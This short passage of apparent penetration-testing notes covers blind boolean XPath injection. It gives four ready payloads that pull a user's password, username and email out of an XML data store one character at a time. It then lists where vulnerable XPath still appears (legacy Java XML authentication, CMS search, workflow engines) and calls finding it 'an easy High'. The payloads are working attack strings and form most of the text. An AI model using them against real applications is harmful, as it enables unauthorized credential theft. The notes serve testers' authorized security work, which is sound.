## BLIND BOOLEAN EXTRACTION
Same pattern as SQLi boolean — guess char by char:
```
' or substring(//user[1]/password/text(),1,1)='a' or 'x'='y
' or contains(//user[1]/username/text(),'a') or 'x'='y
' or string-length(//user[1]/password/text())=6 or 'x'='y
' or starts-with(//user[1]/email/text(),'n') or 'x'='y
```

## NOTE ON REAL-WORLD RELEVANCE
Modern apps rarely use raw XPath (they use XML libraries with parameterized XPath) — but it still appears in:
- Legacy Java `.xml` config-based auth
- Document-index / CMS search features
- Some "workflow engine" products (report origin, "injxd" style)
When you see it, it's often an easy High.
